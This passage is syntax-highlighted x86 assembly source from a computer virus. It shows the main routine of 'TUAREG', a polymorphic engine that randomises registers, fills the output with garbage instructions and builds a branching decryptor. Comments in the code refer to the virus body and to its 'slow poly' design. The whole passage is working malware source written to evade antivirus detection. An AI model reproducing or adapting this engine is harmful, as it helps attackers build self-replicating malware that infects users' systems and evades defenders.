                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Modifier</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set Index1 modifier</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Modifier</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set Index2 modifier</span><span class="sc0">

      </span><span class="sc1">; Initializing of the random generator (to make is slow poly)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTimeReceiver</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">; Register selection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08080808h</span><span class="sc0">
       </span><span class="sc5">@@OtherRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AnyAPIFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SelectAllForKey</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OtherRegister</span><span class="sc0">
       </span><span class="sc5">@@SelectAllForKey</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyOfUsedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save a copy</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoBssSection</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReservedBssAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save a .bss address</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextThing</span><span class="sc0">
      </span><span class="sc5">@@NoBssSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReservedBssAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Get it from another</span><span class="sc0">
                                                      </span><span class="sc1">; place</span><span class="sc0">
      </span><span class="sc5">@@NextThing</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Data1Section</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Directory1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Data2Section</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ArrayOfCalls1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Data3Section</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CallsLevel1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Data4Section</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set some free frames for</span><span class="sc0">
                                                 </span><span class="sc1">; memory reads/writes. Later,</span><span class="sc0">
                                          </span><span class="sc1">; the function SelectAnAddress will</span><span class="sc0">
                                          </span><span class="sc1">; give an address from one of this</span><span class="sc0">
                                          </span><span class="sc1">; frames to read or write freely.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
   </span><span class="sc5">@@LoopFillMemVars2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_F</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopFillMemVars2</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
   </span><span class="sc5">@@LoopFillMemVars</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnAddressLow</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopFillMemVars</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set initial value of the</span><span class="sc0">
                                                </span><span class="sc1">; Index2</span><span class="sc0">

    </span><span class="sc1">;; Let's create all the information for every created branch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfTuaregStackFrame</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
          </span><span class="sc5">@@LoopGetLocalFlags</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">              </span><span class="sc1">; Get local flags</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontRepeatFlag</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGetLocalFlags</span><span class="sc0">
          </span><span class="sc5">@@DontRepeatFlag</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc5">@@LoopFillSubroutineAddresses</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopFillSubroutineAddresses</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopGetLocalFlags</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01010101h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01010101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PreCreateCALLs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EPAddition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">]</span><span class="sc0">
                                
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetIndex1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetIndex2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetKeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DoRandomGarbage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomCalling</span><span class="sc0">     </span><span class="sc1">; Set initial register values</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BifurcationNumber</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Set bifurcation</span><span class="sc0">
                                                </span><span class="sc1">; to 0 (since it's the start)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BranchIdentifier</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Branching</span><span class="sc0"> </span><span class="sc1">; Call the mighty function that TUAREG bases</span><span class="sc0">
                                  </span><span class="sc1">; its power on :)</span><span class="sc0">
                
</span><span class="sc1">;; Once we return from Branching, we have a huge monstruous decryptor cons-</span><span class="sc0">
</span><span class="sc1">;; tructed, with 15 possible addresses to loop and do the same but with diffe-</span><span class="sc0">
</span><span class="sc1">;; rent addresses and code (or to arrive again to the same place, it's nearly</span><span class="sc0">
</span><span class="sc1">;; unpredictable (anarchic relentless... :P).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsToCompleteNdx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; EDX=number of jumps to complete</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpingArrayNdx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; ECX=Number of addresses available to jump.</span><span class="sc0">
                                 </span><span class="sc1">; I know the value of this registers (EDX=10h</span><span class="sc0">
                                 </span><span class="sc1">; and ECX=0Fh), but in the future maybe it'll</span><span class="sc0">
                                 </span><span class="sc1">; be random, so I coded it already in this</span><span class="sc0">
                                 </span><span class="sc1">; manner.</span><span class="sc0">
     </span><span class="sc5">@@CompleteJumps</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Have we finished with jumps?</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Completed</span><span class="sc0">  </span><span class="sc1">; Then, exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsToComplete</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@OtherJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random address to jump</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@OtherJump</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpingArray</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Subtract the address</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; to jump with the address of the jump</span><span class="sc0">
                                    </span><span class="sc1">; itself...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; ...and complete the jump opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CompleteJumps</span><span class="sc0">  </span><span class="sc1">; Repeat</span><span class="sc0">

   </span><span class="sc5">@@Completed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">   </span><span class="sc1">; Restore ESP and release stack frame</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">      </span><span class="sc1">; Finish TUAREG...</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">        </span><span class="sc1">; ...and return to reality :( :P</span><span class="sc0">
</span><span class="sc5">Tuareg</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

